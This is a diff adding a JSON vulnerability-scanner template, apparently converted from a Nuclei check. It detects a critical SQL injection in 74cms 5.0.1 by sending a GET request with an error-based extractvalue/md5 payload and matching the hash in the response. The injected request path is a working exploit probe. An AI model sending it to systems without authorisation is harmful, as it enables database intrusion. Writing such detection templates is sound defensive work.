@@ -1,0 +1,130 @@
+{
+  "id": "74cms-sqli",
+  "name": "74cms Sql Injection",
+  "author": "princechaddha",
+  "severity": "CRITICAL",
+  "description": "A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.",
+  "references": [
+    "https://github.com/possib1e/vuln/issues/3"
+  ],
+  "tags": [
+    "74cms",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "9.8",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/index.php?m\u003d\u0026c\u003dAjaxPersonal\u0026a\u003dcompany_focus\u0026company_id[0]\u003dmatch\u0026company_id[1][0]\u003dtest\") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5({{num}})}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "74cms-sqli",
+    "info": {
+      "name": "74cms Sql Injection",
+      "author": "princechaddha",
+      "severity": "critical",
+      "description": "A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.",
+      "reference": [
+        "https://github.com/possib1e/vuln/issues/3"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "9.8",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "74cms,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/index.php?m\u003d\u0026c\u003dAjaxPersonal\u0026a\u003dcompany_focus\u0026company_id[0]\u003dmatch\u0026company_id[1][0]\u003dtest\") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5({{num}})}}"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
